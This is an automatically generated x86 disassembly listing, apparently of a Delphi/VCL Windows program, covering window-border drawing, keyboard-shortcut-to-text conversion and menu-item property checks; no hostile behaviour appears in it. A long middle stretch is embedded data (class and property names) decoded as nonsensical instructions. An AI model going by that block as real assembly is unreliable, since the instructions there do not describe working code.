mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_4328fc
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_432a57
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_432498
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4323ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_4585f8
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_418448
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_432a84
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
call sub_432228
call sub_432330
test al al
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov al 0x1
call sub_432228
call sub_432330
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
call sub_4321d0
test al al
je r-xdata
sub_432ad0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_432b15
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432b1c
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax rw-data
call sub_405530
mov eax [ rw-data ]
call sub_404650
sub_432f64
clc
push edx
push ecx
[ ebx + ebp * 2 + 0x65980043 ]
inc ebx
add [ eax + 0x66 ] ch
inc ebx
add [ eax + 0xc004366 ] ah
imul eax [ ebx ] 0xfffffff8
push 0x43
add al dh
arpl [ ebx ] ax
or [ ebp + ecx * 2 + 0x65 ] edx
outsb
jne r-xdata
test al 0x0
add bh bh
test al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
push es
add [ esi ] al
inc edx
inc ebx
push 0x646b6365
sub eax 0x3b0043
add bh bh
inc eax
jbe r-xdata
arpl [ ebx + 0x64 ] bp
insd
xchg esp eax
das
inc ebx
add [ edi ] al
or [ ebp + ecx * 2 + 0x65 ] edx
outsb
jne r-xdata
je r-xdata
add [ ecx ] al
add eax [ eax ]
or [ ecx + 0x75 ] eax
je r-xdata
add [ eax ] 0x0
add [ eax ] al
je r-xdata
cmp [ eax ] al
add bh bh
js r-xdata
imul esi [ ebp + ebp * 2 + 0x61 ] 0x432b7870
add [ eax ] cl
add bh bh
hlt
outsd
inc edx
jb r-xdata
dec eax
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
insd
clc
inc ebx
add [ edx + eax * 4 + 0x41 ] al
add [ eax ] bl
add [ 0x756e654d ] al
jae r-xdata
inc eax
add [ ecx ] bh
inc ebx
add [ ebp * 2 + 0x43 ] al
add [ eax ] al
or [ eax ] eax
pop es
inc ebx
push 0x656b6365
pop eax
test [ eax + eax + 0x7c ] al
add [ eax ] al
call esp
outsb
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x530d000a ] al
jne r-xdata
outsb
jne r-xdata
popad
imul edx [ eax + edx + 0x300040 ] 0x0
inc [ esp ]
jns r-xdata
add [ eax ] al
add [ edx ] 0x0
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
add [ ecx ] 0xffffff88
inc ebx
add [ eax ] ch
push 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41060002 ] al
adc [ eax ] al
cmp eax 0x70ff0000
imul eax [ ebx ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x61 ] edx
imul ebp [ fs : edi + 0x49 ] 0x746d6574
outsb
dec ecx
outsb
js r-xdata
add [ eax ] al
or eax 0x72470a00
outsd
jne r-xdata
add [ eax ] al
dec ebp
push esp
adc [ eax ] al
aas
add [ eax ] al
inc [ ebp + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
insd
popad
jae r-xdata
add [ eax ] al
dec esp
inc ebx
add [ ebp * 2 + 0x43 ] ah
add [ eax + 0x1 ] al
or al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
imul ebp [ edi + 0x6e ] r-xdata
inc ebx
add ah ah
insb
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070008 ] al
popad
jo r-xdata
add bh bh
add al 0x64
sub eax 0x3c0043
add bh bh
mov esp 0x1004377
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add eax 0x75411100
je r-xdata
cwde
inc ebx
jne r-xdata
outsb
je r-xdata
outsb
inc ecx
add [ eax + eax ] dl
call [ eax + eax ]
jmp [ ebp + ebp * 2 + 0x43 ]
adc [ eax ] al
cmp al [ eax ]
add bh bh
shl [ esi + 0x43 ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax [ eax ]
pop es
inc esp
popa
jne r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] bh
add [ eax ] al
outsb
aaa
inc edx
add [ eax ] al
push 0x43
add [ eax + 0x100436a ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42060006 ] al
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
inc ecx
add [ eax + 0x7 ] dl
inc edx
add [ eax + ecx * 2 + 0x8c0040 ] ah
inc edx
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
outsd
dec ecx
je r-xdata
js r-xdata
je r-xdata
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
cmp al 0x0
add [ edi + ebx * 4 ] ah
inc ecx
add [ ebx + eax + 0x42 ] dl
add [ eax - 0x62 ] al
inc ecx
add [ eax ] bl
add [ ebx ] 0xffffffb4
add [ ebx ] 0x3c
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add al bl
js r-xdata
dec eax
inc eax
add [ eax + eax + 0x48ac0042 ] cl
ja r-xdata
imul esp [ ebx + 0x6b ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
insd
je r-xdata
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
movsb [ edi ] [ esi ]
insd
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xchg esp eax
adc [ eax ] al
pop eax
add [ eax ] al
[ eax ]
add bh bh
inc esp
insd
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4804000f ] al
imul ebp [ esi + 0x74 ] r-xdata
inc eax
add [ eax ] al
adc [ eax ] al
cmp [ eax ] eax
add bh bh
int3
jne r-xdata
add [ eax ] al
add al 0x0
std
add [ eax ] dh
add [ ebx ] 0xe
add [ edx + 0x33 ] ch
je r-xdata
inc ebx
add [ ebx + esi + 0x580043 ] al
add [ eax ] al
dec eax
add [ ecx ] sub_420750
movsb [ edi ] [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0015 ] al
outsb
inc esp
jb r-xdata
add [ eax ] al
inc [ ecx ]
inc ecx
add [ eax ] ah
add bh bh
aam 0x65
inc ebx
add [ ebp + ebp * 2 + 0x43 ] ah
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49050002 ] al
je r-xdata
xor eax [ ebx ]
inc esp
add [ ecx ] 0x3
add [ 0x756e654d ] al
jae r-xdata
inc eax
add [ eax - 0x17ffbfb8 ] ah
dec eax
insd
hlt
add [ 0x654d6e4f ] cl
popad
je r-xdata
cmp al 0x4
inc edx
insd
jae r-xdata
nop
das
inc ebx
add [ eax + eax ] dh
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add eax 0x6d657449
add [ eax + 0x3400432f ] dl
add [ eax ] al
inc [ eax ]
add [ eax ] al
add [ esp + eax + 0x42 ] al
add [ eax + 0x7 ] dh
inc edx
add [ eax + edi * 2 ] ch
inc ebx
add [ eax ] al
add [ ebx ] 0x2c
jns r-xdata
dec esp
add al 0x42
jb r-xdata
pop eax
xor eax [ ebx ]
nop
xor eax [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x33
insd
jl r-xdata
add [ eax - 0x78 ] al
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
add [ ebp + ebp - 0x77cfffbd ] ch
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] dl
add [ esi ] cl
inc eax
add [ eax ] bl
xor al 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi + 0x43 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi + 0x43 ] dl
add [ eax + 0x7680042 ] dh
inc edx
add [ esp + eax + 0x42 ] cl
inc ebx
add [ esp + eax ] bh
inc edx
dec ecx
je r-xdata
jae r-xdata
sub al 0x43
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0017 ] al
outsb
dec ebp
popad
add [ eax ] al
inc ebx
add [ eax - 0x67010000 ] bl
push es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x5865646f
dec eax
outsd
je r-xdata
dec ebp
outsb
jne r-xdata
add [ eax + 0x7680042 ] dh
inc edx
add [ esp + eax + 0x42 ] cl
add [ esp + eax + 0x42 ] al
add [ eax + 0x7 ] dh
inc edx
add [ eax + edi * 2 ] ch
inc ebx
add [ eax ] al
add [ ebx ] 0x58
mov [ ebx ] eax
cwde
mov [ ebx ] al
or [ ebp + ecx * 2 + 0x61 ] edx
imul ebp [ esi + 0x4d ] 0x8b756e65
add [ edi + ebx * 4 ] ah
inc ecx
add [ ebx + eax + 0x42 ] dl
add [ eax - 0x62 ] al
inc ecx
add [ eax ] bl
add [ ebx ] 0xffffffb4
add [ ebx ] 0x3c
add al 0x42
add al 0x42
insd
lea eax [ eax ]
sbb al 0x33
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x33 ] bl
inc ebx
add [ eax + 0x4333 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
jns r-xdata
add [ eax ] ah
add [ eax ] al
shl [ edx ] 0x1
inc ebx
add [ eax + 0x7 ] dl
inc edx
add [ eax + ecx * 2 + 0x8c0040 ] ah
inc edx
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add al bl
js r-xdata
add [ eax ] al
push esp
xor al 0x43
shl [ esp + esi + 0x43 ] 0x0
pop es
or [ ebp + ecx * 2 + 0x61 ] edx
imul ebp [ esi + 0x4d ] 0x18756e65
xor al 0x43
add [ ebx + esi + 0xb0043 ] cl
add eax 0x756e654d
jae r-xdata
test [ eax + eax + 0x48 ] al
add [ eax ] al
pop eax
lodsb [ esi ]
sub eax 0x88540043
inc ebx
add [ eax + ecx * 4 + 0x43 ] ah
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
adc [ ecx + 0x75 ] eax
je r-xdata
dec ecx
insd
popad
jae r-xdata
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
adc [ eax ] al
inc eax
add [ eax ] al
sub_433a58
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_44edd8
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_455430
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_433ab4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
movzx eax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_433aec
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_405530
push 0x0
movzx eax [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_4057a0
sub_433b40
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_433d1f
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ebx [ ebp - 0x2 ]
movzx eax bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
movzx edx bl
mov edx [ edx * 4 + rw-data ]
call sub_4055c8
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
movzx edx bl
sub edx 0x41
add edx 0x41
call sub_405718
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
movzx edx bl
mov edx [ edx * 4 + rw-data ]
call sub_4055c8
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_4055c8
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
movzx edx bl
sub edx 0x60
add edx 0x30
call sub_405718
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
movzx edx bl
sub edx 0x30
add edx 0x30
call sub_405718
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_405530
mov eax esi
call sub_405530
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_4055c8
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
movzx eax bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_409d70
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405864
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
movzx eax [ ebp - 0x2 ]
call sub_433aec
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_405818
lea eax [ ebp - 0x8 ]
add bl 0x4
movzx edx bl
mov edx [ edx * 4 + rw-data ]
call sub_4055c8
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_405818
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_405818
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_405818
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433d26
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_405554
retn
sub_433d38
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
mov edx ebx
test edx edx
je r-xdata
sub eax 0x4
mov eax [ eax ]
cmp edx eax
jg r-xdata
sub edx 0x4
mov edx [ edx ]
movzx eax [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
test esi esi
je r-xdata
mov eax ebx
call sub_4059dc
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4059dc
mov ecx esi
pop edx
call sub_409b5c
test eax eax
jne r-xdata
sub esi 0x4
mov esi [ esi ]
mov [ ebp - 0x5 ] 0x1
mov eax ebx
test eax eax
je r-xdata
mov edx [ ebp - 0x4 ]
mov ecx eax
mov eax 0x1
xchg edx eax
call sub_405a84
sub eax 0x4
mov eax [ eax ]
sub_433dc0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_433ee3
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x6 ] 0x0
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_433d38
test al al
je r-xdata
or [ ebp - 0x8 ] 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_433d38
test al al
je r-xdata
or [ ebp - 0x8 ] 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_433d38
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_433d38
test al al
je r-xdata
or [ ebp - 0x8 ] 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or [ ebp - 0x8 ] 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433eea
lea eax [ ebp - 0x10 ]
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov di 0x8
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
push esi
mov eax [ ebp - 0xc ]
call sub_4059dc
push eax
push ebx
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
test eax eax
jne r-xdata
sub esi 0x4
mov esi [ esi ]
inc edi
cmp di 0x256
jne r-xdata
or di [ ebp - 0x8 ]
mov [ ebp - 0x6 ] di
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_433b40
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
sub_433f24
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
movzx eax [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_4365a0
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_4365b0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_433f88
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_4365a0
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_4365a0
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_4365b0
movzx eax [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
movzx eax [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_4365b0
movzx eax [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
movzx eax [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_433f24
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_433f24
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_4365b0
movzx eax [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_4365b0
movzx eax [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_4340d8
push ebx
mov ebx eax
mov eax ebx
call sub_44a500
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_404800
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_4393ec
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_434110
push ebx
mov ebx eax
mov eax ebx
call sub_44a514
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_404800
movzx eax [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_434140
push ebx
mov ebx eax
mov eax ebx
call sub_44a528
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_404800
movzx eax [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_434170
push ebx
mov ebx eax
mov eax ebx
call sub_44a550
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_404800
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4341a0
push ebx
mov ebx eax
mov eax ebx
call sub_44a578
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_404800
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_405974
je r-xdata
mov al 0x1
pop ebx
retn
sub_4341d4
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_44a53c
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_404800
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_434210
push ebx
mov ebx eax
mov eax ebx
call sub_44a58c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_404800
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_434244
push ebx
mov ebx eax
mov eax ebx
call sub_44a5a0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_404800
movzx eax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_434278
push ebx
mov ebx eax
mov eax ebx
call sub_44a5b4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_404800
movzx eax [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4342ac
push ebx
mov ebx eax
mov eax ebx
call sub_4208d0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4342d4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_4342f4
push ebx
push esi
mov esi edx
